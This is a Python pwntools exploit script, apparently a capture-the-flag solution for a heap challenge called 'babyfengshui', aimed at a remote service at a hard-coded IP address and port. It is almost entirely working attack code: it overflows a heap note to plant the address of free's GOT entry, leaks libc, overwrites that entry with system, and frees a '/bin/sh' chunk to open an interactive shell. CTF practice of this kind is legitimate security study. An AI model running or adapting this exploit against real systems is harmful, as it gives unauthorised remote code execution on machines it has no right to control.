from pwn import *
from LibcSearcher import *

#context.log_level="debug"

def add(desc_size,name,text_length,text):
    p.recvuntil('Action: ')
    p.sendline('0')
    p.recvuntil('description: ')
    p.sendline(str(desc_size))
    p.recvuntil('name: ')
    p.sendline(name)
    p.recvuntil('length: ')
    p.sendline(str(text_length))
    p.recvuntil('text: ')
    p.sendline(text)

def delete(index):
    p.recvuntil('Action: ')
    p.sendline('1')
    p.recvuntil('index: ')
    p.sendline(str(index))

def display(index):
    p.recvuntil('Action: ')
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil("name: ")
    name = p.recvuntil("\n" , drop = True)
    p.recvuntil("description: ")
    desc = p.recvuntil("\n" , drop = True)
    return [name , desc]

def edit(index,text_length,text):
    p.recvuntil('Action: ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.sendlineafter("text length: " , str(text_length))
    p.sendafter("text: " , text)

p = remote("111.198.29.45" , 42445)
#p = process('babyfengshui')
elf = ELF('babyfengshui')
#libc = ELF('libc.so.6')

free_got = elf.got['free']

add(0x20,'0',0x20,'0')
add(0x20,'1',0x20,'1')
add(0x20,'2',0x20,'/bin/sh\x00')
delete(0)

payload = 'a'*0xb0+p32(free_got)
add(0x30,'3',0xc0,payload)
#gdb.attach(p)

(name,desc) = display(1)
free_addr = u32(desc[:4])
print 'free_addr:'+hex(free_addr)
libc = LibcSearcher("free", free_addr)
libc_base = free_addr - libc.dump('free')
system_addr = libc.dump('system')+libc_base
print 'system_addr:'+hex(system_addr)
# print 'free_addr:'+hex(free_addr)
# sys_addr = free_addr - libc.symbols['free']+libc.symbols['system']
# print 'sys_addr:'+hex(sys_addr)

edit(1,4,p32(system_addr))
# #gdb.attach(p)
delete(2)
p.interactive()